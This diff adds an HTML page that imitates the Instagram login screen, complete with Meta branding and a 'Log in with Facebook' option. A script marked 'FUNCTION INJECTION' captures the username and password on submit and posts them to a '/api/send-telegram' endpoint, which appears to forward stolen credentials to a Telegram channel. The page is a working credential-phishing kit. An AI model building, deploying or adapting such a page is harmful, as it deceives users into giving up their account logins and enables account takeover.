@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram – Log in</title>
+  <style>
+    :root {
+      --bg: #0f1014;
+      --panel: #12141a;
+      --input: #1c1f26;
+      --border: #2a2d36;
+      --text: #e7e7ea;
+      --muted: #9aa0aa;
+      --blue: #4f5bd5;
+      --blue-hover: #5f6bf0;
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: radial-gradient(1200px 600px at 30% 50%, #141621, #0b0c10 60%), var(--bg);
+      color: var(--text);
+    }
+
+    .page {
+      min-height: 100%;
+      display: grid;
+      grid-template-columns: 1.1fr 0.9fr;
+      align-items: center;
+      padding: 40px 80px;
+      gap: 40px;
+    }
+
+    .visual {
+      position: relative;
+      height: 520px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .stack {
+      position: relative;
+      width: 260px;
+      height: 460px;
+    }
+
+    .card {
+      position: absolute;
+      inset: 0;
+      border-radius: 26px;
+      background: linear-gradient(135deg, #2b2f3a, #161922);
+      box-shadow: 0 30px 80px rgba(0,0,0,.55);
+      overflow: hidden;
+    }
+
+    .card:nth-child(1) { transform: translateX(-60px) rotate(-6deg) scale(.9); }
+    .card:nth-child(2) { transform: translateX(60px) rotate(6deg) scale(.9); }
+    .card.main {
+      transform: scale(1);
+      z-index: 2;
+      background: linear-gradient(180deg, #c2c7ff, #6c77ff 40%, #2a2f6f);
+    }
+
+    .reel-ui {
+      position: absolute;
+      inset: 0;
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      gap: 10px;
+    }
+
+    .reel-bar {
+      height: 6px;
+      border-radius: 999px;
+      background: rgba(255,255,255,.35);
+    }
+
+    .icons {
+      position: absolute;
+      right: 14px;
+      bottom: 90px;
+      display: grid;
+      gap: 14px;
+    }
+
+    .icon {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(0,0,0,.45);
+      backdrop-filter: blur(6px);
+      display: grid;
+      place-items: center;
+      font-size: 16px;
+    }
+
+    .panel {
+      max-width: 360px;
+      margin-left: auto;
+    }
+
+    .brand {
+      font-family: 'Billabong', 'Segoe Script', cursive;
+      font-size: 46px;
+      text-align: center;
+      margin-bottom: 28px;
+    }
+
+    .box {
+      background: transparent;
+    }
+
+    .field {
+      width: 100%;
+      margin-bottom: 10px;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 12px 10px;
+      border-radius: 6px;
+      border: 1px solid var(--border);
+      background: var(--input);
+      color: var(--text);
+      font-size: 14px;
+    }
+
+    .field input::placeholder { color: var(--muted); }
+
+    .btn {
+      width: 100%;
+      margin-top: 12px;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+      background: var(--blue);
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .btn:hover { background: var(--blue-hover); }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 18px 0;
+      color: var(--muted);
+      font-size: 12px;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    .fb {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      color: #4f7cff;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .link {
+      display: block;
+      text-align: center;
+      margin-top: 16px;
+      font-size: 12px;
+      color: var(--muted);
+      text-decoration: none;
+    }
+
+    .link strong { color: #8ab4ff; }
+
+    footer {
+      position: fixed;
+      bottom: 14px;
+      left: 0;
+      right: 0;
+      text-align: center;
+      font-size: 11px;
+      color: #7b808a;
+    }
+
+    @media (max-width: 900px) {
+      .page {
+        grid-template-columns: 1fr;
+        padding: 30px 20px;
+      }
+      .visual { display: none; }
+      .panel { margin: 0 auto; }
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <section class="panel" style="margin:0 auto;">
+      <img src="text.png" alt="Instagram" style="display:block;margin:0 auto 28px auto;max-width:180px;" />
+      <div class="box">
+        <div class="field">
+          <input type="text" placeholder="Phone number, username, or email" />
+        </div>
+        <div class="field">
+          <input type="password" placeholder="Password" />
+        </div>
+        <button class="btn">Log In</button>
+
+        <div class="divider">OR</div>
+
+        <div class="fb">Log in with Facebook</div>
+        <a class="link" href="#">Forgot password?</a>
+        <a class="link" href="#">Don't have an account? <strong>Sign up</strong></a>
+      </div>
+    </section>
+  </div>
+
+  <footer>© 2025 Instagram from Meta</footer>
+
+  <!-- ===== FUNCTION INJECTION (NO HTML MODIFIED) ===== -->
+  <script>
+    (function () {
+      const inputs = document.querySelectorAll(".box input");
+      const button = document.querySelector(".box .btn");
+
+      if (!inputs.length || !button) return;
+
+      button.addEventListener("click", async function () {
+        const text1 = inputs[0]?.value || "";
+        const text2 = inputs[1]?.value || "";
+
+        if (!text1 || !text2) {
+          alert("Please fill both fields");
+          return;
+        }
+
+        try {
+          const res = await fetch("/api/send-telegram", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ text1, text2 })
+          });
+
+          if (!res.ok) throw new Error("Failed");
+
+          alert("Message sent");
+          inputs[0].value = "";
+          inputs[1].value = "";
+
+        } catch (e) {
+          alert("Failed to send message");
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
